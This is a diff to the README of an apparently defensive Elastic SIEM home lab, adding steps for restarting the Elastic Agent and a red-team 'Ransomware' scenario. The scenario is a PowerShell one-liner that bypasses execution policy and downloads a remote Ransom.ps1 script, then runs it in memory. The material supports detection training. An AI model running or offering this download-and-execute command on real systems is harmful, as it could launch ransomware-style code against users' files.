@@ -31,10 +31,26 @@ With the Elastic agent ingesting Sysmon, Powershell, wineventlogs, Endpoint Moni
 [Elastic_Lab.zip](https://mega.nz/file/OnhVybAJ#skZQ8ts4-PLVU_RLYg4f_YXC8iNUqWC7S3Wmcptd2u0)
   
 -------------------  
+### Start Up
+
+On start up the Elastic Agent and Fleet Server need to align, sometimes it may require a manual restart.  
+Open Kibana and search for fleet managment.  
+
+<img src="https://github.com/H0wl3r/Elastic_Lab/blob/main/Pictures/Elastic_server.png" width=75% height=75%>  
+
+if it shows that the agent is offline restart the agent by running the `Restart_Elastic_Agent.bat` as administrator.  
+  
+<img src="https://github.com/H0wl3r/Elastic_Lab/blob/main/Pictures/Elastic_server2.png" width=75% height=75%>  
+
+-------------------  
    
 ### Red Team Scenarios
 
-3 scenarios have been created and instructions to execute can be found in the scenarios section
+#### Ransomware ####
+
+```
+powershell.exe -exec Bypass -noexit -C "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Scripts/Ransom.ps1')"
+```
   
 -------------------  
    
